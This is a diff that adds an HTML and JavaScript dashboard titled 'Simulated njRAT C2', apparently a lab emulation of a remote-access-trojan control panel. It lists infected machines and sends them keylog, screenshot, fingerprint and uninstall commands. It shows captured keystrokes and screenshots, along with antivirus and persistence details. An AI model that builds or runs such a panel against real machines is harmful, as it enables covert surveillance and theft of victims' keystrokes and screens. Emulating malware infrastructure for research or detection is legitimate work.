@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulated njRAT C2</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+        }
+        .navbar { background-color: #1a1a1a !important; }
+        .card { background-color: #1f1f1f; border: 1px solid #333; }
+        .table { --bs-table-bg: #1f1f1f; --bs-table-color: #e0e0e0; }
+        .nav-tabs .nav-link {
+            color: #aaa;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #1f1f1f;
+            color: #00ff88;
+            border-bottom: 2px solid #00ff88;
+        }
+        .screenshot-img {
+            max-height: 180px;
+            object-fit: cover;
+            border: 1px solid #333;
+            transition: all 0.3s;
+        }
+        .screenshot-img:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
+        }
+        .log-area {
+            background-color: #111;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container-fluid">
+            <a class="navbar-brand fw-bold text-success" href="#">
+                <!-- <i class="fas fa-skull"> -->
+                <i></i> Simulated njRAT C2
+            </a>
+        </div>
+    </nav>
+
+    <!-- ================== KEYLOG PREVIEW MODAL ================== -->
+    <div class="modal fade" id="keylogModal" tabindex="-1">
+        <div class="modal-dialog modal-xl">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="keylogModalTitle">Keylog Preview</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <pre id="keylogPreview" class="log-area p-3" style="max-height: 70vh; overflow-y: auto; white-space: pre-wrap;"></pre>
+                </div>
+                <div class="modal-footer">
+                    <a id="downloadKeylogBtn" class="btn btn-outline-light" href="#" download>
+                        <i class="fas fa-download"></i> Download Full Log
+                    </a>
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== FINGERPRINT MODAL ==================== -->
+    <div class="modal fade" id="fingerprintModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title">Bot Fingerprint</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body" id="fingerprintContent"><!-- Filled by JS --></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid mt-3">
+        <ul class="nav nav-tabs" id="mainTabs" role="tablist">
+            <li class="nav-item">
+                <button class="nav-link active" id="bots-tab" data-bs-toggle="tab" data-bs-target="#bots" type="button">
+                    <i class="fas fa-robot"></i> Bots
+                </button>
+            </li>
+            <li class="nav-item">
+                <button class="nav-link" id="screenshots-tab" data-bs-toggle="tab" data-bs-target="#screenshots" type="button">
+                    <i class="fas fa-image"></i> Screenshots
+                </button>
+            </li>
+            <li class="nav-item">
+                <button class="nav-link" id="keylogs-tab" data-bs-toggle="tab" data-bs-target="#keylogs" type="button">
+                    <i class="fas fa-keyboard"></i> Keylogs
+                </button>
+            </li>
+        </ul>
+
+        <div class="tab-content">
+            <!-- ================== BOTS TAB ================== -->
+            <div class="tab-pane fade show active" id="bots">
+                <div class="card mt-3">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between mb-3">
+                            <h5 class="card-title">Connected Bots</h5>
+                            <button class="btn btn-success btn-sm" onclick="refreshBots()">
+                                <i class="fas fa-sync"></i> Refresh
+                            </button>
+                        </div>
+
+                        <table class="table table-hover" id="botsTable">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>PC Name</th>
+                                    <th>Username</th>
+                                    <th>OS</th>
+                                    <th>Last Seen</th>
+                                    <th>IP</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ================== SCREENSHOTS TAB ================== -->
+            <div class="tab-pane fade" id="screenshots">
+                <div class="card mt-3">
+                    <div class="card-body">
+                        <h5 class="mb-3">Screenshots Gallery</h5>
+                        <div class="row" id="gallery"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ================== KEYLOGS TAB ================== -->
+            <div class="tab-pane fade" id="keylogs">
+                <div class="card mt-3">
+                    <div class="card-body">
+                       <div class="d-flex justify-content-between mb-3">
+                          <h5 class="card-title">Keylogs Gallery</h5>
+                          <button class="btn btn-success btn-sm" onclick="loadKeylogs()">
+                             <i class="fas fa-sync"></i> Refresh
+                           </button>
+                        </div>
+                    <div class="row" id="keylogsGallery"></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let selectedBotId = null;
+
+
+        async function refreshBots() {
+            const res = await fetch('/api/bots');
+            const bots = await res.json();
+            
+            const tbody = document.querySelector('#botsTable tbody');
+            tbody.innerHTML = '';
+
+            bots.forEach(bot => {
+                const row = document.createElement('tr');
+                row.style.cursor = 'pointer';
+                row.innerHTML = `
+                    <td>${bot.id}</td>
+                    <td>${bot.pc_name}</td>
+                    <td>${bot.username}</td>
+                    <td>${bot.os}</td>
+                    <td>${bot.last_seen}</td>
+                    <td>${bot.addr}</td>
+                    <td>
+                        <button class="btn btn-sm btn-primary" onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'fingerprint')">FP</button>
+                        <button class="btn btn-sm btn-warning" onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'keylog')">KL</button>
+                        <button class="btn btn-sm btn-info"    onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'screenshot')">CAP</button>
+                        <button class="btn btn-sm btn-success" onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'restart')">UN-Restart</button>
+                        <button class="btn btn-sm btn-danger"  onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'terminate')">UN-Stop</button>
+                        <button class="btn btn-sm btn-danger"  onclick="event.stopImmediatePropagation(); sendCommand('${bot.id}', 'uninstall')">UN-Uninstall</button>
+                    </td>
+                `;
+                
+                // Click anywhere on row to show fingerprint
+                row.onclick = () => showFingerprint(`${bot.id}`);
+                tbody.appendChild(row);
+            });
+        }
+
+        async function sendCommand(botId, cmd) {
+            const res = await fetch('/api/send_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ bot_id: botId, command: cmd })
+            });
+            const data = await res.json();
+            
+            if (data.status === 'success') {
+                alert(`Command sent successfully! (${cmd})`);
+            } else {
+                alert('Failed to send command');
+            }
+        }
+
+        async function loadScreenshots() {
+            const res = await fetch('/api/screenshots');
+            const files = await res.json();
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = '';
+        
+            files.forEach(file => {
+                const col = document.createElement('div');
+                col.className = 'col-md-3 col-sm-4 mb-3';
+                col.innerHTML = `
+                    <div class="card h-100">
+                        <img src="/screenshots/${file}" class="screenshot-img w-100" alt="${file}" 
+                             onclick="window.open('/screenshots/${file}', '_blank')">
+                        <div class="card-body p-2">
+                            <small class="text-muted d-block">${file}</small>
+                        </div>
+                    </div>
+                `;
+                gallery.appendChild(col);
+            });
+        }
+
+       let currentModalBotId = null;
+       let modalRefreshInterval = null;
+
+        async function showFingerprint(botId) {
+            currentModalBotId = botId;
+            
+            const res = await fetch(`/api/bot/${botId}`);
+            const data = await res.json();
+            
+            if (data.status === 'error') {
+                alert(data.message);
+                return;
+            }
+        
+            let html = `
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>System Info</h6>
+                        <table class="table table-sm table-dark">
+                            <tr><td><strong>PC Name</strong></td><td>${data.pc_name}</td></tr>
+                            <tr><td><strong>Username</strong></td><td>${data.username}</td></tr>
+                            <tr><td><strong>OS</strong></td><td>${data.os}</td></tr>
+                            <tr><td><strong>IP</strong></td><td>${data.addr}</td></tr>
+                        </table>
+                        <small class="text-muted">Webcam: ${data.webcam}</small>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Security</h6>
+                        <p><strong>AV Products:</strong></p>
+                        <ul class="list-group mb-2">
+                            ${data.AV.length ? data.AV.map(av => `<li class="list-group-item bg-dark">${av}</li>`).join('') : '<li class="list-group-item bg-dark">None detected</li>'}
+                        </ul>
+                    </div>
+                </div>
+        
+                <!-- Real-time Active Window -->
+                <div class="mt-3 p-3 bg-dark border border-success rounded">
+                    <strong>Current Active Window:</strong>
+                    <span id="activeWindowDisplay" class="text-warning fw-bold d-block mt-1">${data.active_window || 'Unknown'}</span>
+                    <small class="text-muted" id="lastUpdated">Last updated: just now</small>
+                </div>
+        
+                <details class="mt-3">
+                    <summary>Configuration</summary>
+                    <div class="bg-black p-3 text-info small">
+                        <strong>Connection:</strong> ${data.config_info.connection || 'N/A'}<br>
+                        <strong>Process name:</strong> ${data.config_info.process_name || 'N/A'}<br>
+                        <strong>Temp:</strong> ${data.config_info.temp_path || 'N/A'}<br>
+                        <strong>Copy to Tmp:</strong> ${data.config_info.copy_to_tmp}<br>
+                        <strong>Copy to Startup:</strong> ${data.config_info.copy_to_startup}<br>
+                        <strong>Run key:</strong> ${data.config_info.use_run_key}<br>
+                    </div>
+                </details>
+        
+                <details>
+                    <summary>Full Raw Fingerprint</summary>
+                    <pre class="bg-black p-2 text-success small">${JSON.stringify(data.full_fingerprint, null, 2)}</pre>
+                </details>
+            `;
+        
+            document.getElementById('fingerprintContent').innerHTML = html;
+            
+            const modal = new bootstrap.Modal(document.getElementById('fingerprintModal'));
+            modal.show();
+        
+            // Start real-time refresh
+            startModalRefresh();
+        }
+        
+        // Real-time updater
+        function startModalRefresh() {
+            // Clear any existing interval
+            if (modalRefreshInterval) clearInterval(modalRefreshInterval);
+        
+            modalRefreshInterval = setInterval(async () => {
+                if (!currentModalBotId) return;
+        
+                try {
+                    const res = await fetch(`/api/bot/${currentModalBotId}/refresh`);
+                    const data = await res.json();
+        
+                    if (data.status !== 'error') {
+                        const windowEl = document.getElementById('activeWindowDisplay');
+                        const timeEl = document.getElementById('lastUpdated');
+                        
+                        if (windowEl) windowEl.textContent = data.active_window || 'Unknown';
+                        if (timeEl) timeEl.textContent = `Last updated: ${data.last_seen}`;
+                    }
+                } catch (e) {
+                    console.log("Modal refresh failed (bot probably disconnected)");
+                }
+            }, 1500); // Update every 1.5 seconds
+        }
+        
+        // Stop refresh when modal is closed
+        document.getElementById('fingerprintModal').addEventListener('hidden.bs.modal', () => {
+           currentModalBotId = null;
+           if (modalRefreshInterval) {
+               clearInterval(modalRefreshInterval);
+               modalRefreshInterval = null;
+           }
+        });
+        // Auto refresh
+        setInterval(() => {
+            refreshBots();
+            loadScreenshots();
+            loadKeylogs();
+        }, 5000);
+        async function loadKeylogs() {
+            const res = await fetch('/api/keylogs');
+            const files = await res.json();
+            const gallery = document.getElementById('keylogsGallery');
+            gallery.innerHTML = '';
+        
+            if (files.length === 0) {
+                gallery.innerHTML = `
+                    <div class="col-12 text-center text-muted py-5">
+                        <i class="fas fa-keyboard fa-3x mb-3"></i>
+                        <p>No keylogs yet. Send <strong>KL</strong> command to a bot.</p>
+                    </div>`;
+                return;
+            }
+        
+            files.forEach(file => {
+                const col = document.createElement('div');
+                col.className = 'col-md-6 col-lg-4 mb-3';
+                col.innerHTML = `
+                    <div class="card h-100 bg-dark border-secondary">
+                        <div class="card-body">
+                            <div class="d-flex align-items-start">
+                                <i class="fas fa-file-alt fa-2x text-warning me-3 mt-1"></i>
+                                <div class="flex-grow-1">
+                                    <h6 class="text-light mb-1">${file}</h6>
+                                    <small class="text-muted">Keylog File</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-footer bg-dark border-top border-secondary">
+                            <button class="btn btn-sm btn-outline-light w-100" 
+                                    onclick="previewKeylog('${file}')">
+                                <i class="fas fa-eye"></i> Preview
+                            </button>
+                        </div>
+                    </div>
+                `;
+                gallery.appendChild(col);
+            });
+        }
+        
+        async function previewKeylog(filename) {
+            try {
+                const res = await fetch(`/keylogs/${filename}`);
+                const text = await res.text();
+        
+                document.getElementById('keylogModalTitle').textContent = `Keylog: ${filename}`;
+                document.getElementById('keylogPreview').textContent = text || "Empty log file.";
+        
+                // Set download link
+                const downloadBtn = document.getElementById('downloadKeylogBtn');
+                downloadBtn.href = `/keylogs/${filename}`;
+                downloadBtn.download = filename;
+        
+                new bootstrap.Modal(document.getElementById('keylogModal')).show();
+            } catch (e) {
+                alert("Failed to load keylog preview.");
+            }
+        }
+        // Auto refresh keylogs when tab is active
+        let keylogsTabObserver = null;
+        
+        document.getElementById('keylogs-tab').addEventListener('click', () => {
+            setTimeout(loadKeylogs, 300);
+        });
+        
+        // Initial load
+        window.onload = () => {
+            refreshBots();
+            loadKeylogs();
+            loadScreenshots();
+        };
+    </script>
+</body>
+</html>
+
